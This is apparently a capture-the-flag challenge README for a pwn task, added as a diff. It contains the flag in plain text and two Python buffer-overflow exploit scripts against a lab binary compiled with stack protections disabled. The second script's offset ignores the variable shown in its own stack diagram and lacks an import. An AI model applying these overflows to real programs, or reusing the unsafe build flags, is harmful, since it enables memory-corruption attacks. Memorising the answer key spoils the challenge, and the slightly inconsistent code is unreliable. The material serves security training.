@@ -1,0 +1,68 @@
+# Challenge 23: Buffer Overflow
+# Category: Pwn
+# Points: 800
+# Difficulty: Hard
+
+## Description
+This program has a vulnerable function. Can you exploit it to get the flag?
+
+[Provide compiled challenge binary]
+
+## How to Create the Challenge
+```bash
+# Create source
+python3 generate.py create
+
+# Compile (Linux with gcc)
+python3 generate.py compile
+```
+
+Or manually:
+```bash
+gcc -o challenge challenge.c -fno-stack-protector -no-pie -z execstack
+```
+
+## Flag
+flag{buffer_overflow_overwrites_variables}
+
+## Solution
+Classic buffer overflow to overwrite the `authorized` variable.
+
+### Understanding the Stack:
+```
+[buffer (64 bytes)][authorized (4 bytes)][saved RBP][return address]
+```
+
+### Solution 1: Overwrite authorized (Simple)
+```python
+import struct
+
+# 64 bytes to fill buffer + 4 bytes to set authorized = 1
+payload = b'A' * 64 + struct.pack('<I', 1)
+
+# Send to program
+import subprocess
+proc = subprocess.Popen(['./challenge'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+stdout, _ = proc.communicate(payload + b'\n')
+print(stdout.decode())
+```
+
+### Solution 2: Redirect to win() (Advanced)
+```python
+import struct
+
+# Find win() address: objdump -d challenge | grep win
+win_addr = 0x401156  # Example address
+
+# 64 (buffer) + 8 (saved RBP) + win() address
+payload = b'A' * 64 + b'B' * 8 + struct.pack('<Q', win_addr)
+
+proc = subprocess.Popen(['./challenge'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+stdout, _ = proc.communicate(payload + b'\n')
+print(stdout.decode())
+```
+
+### Tools:
+- GDB with GEF/PEDA
+- pwntools (Python)
+- ROPgadget
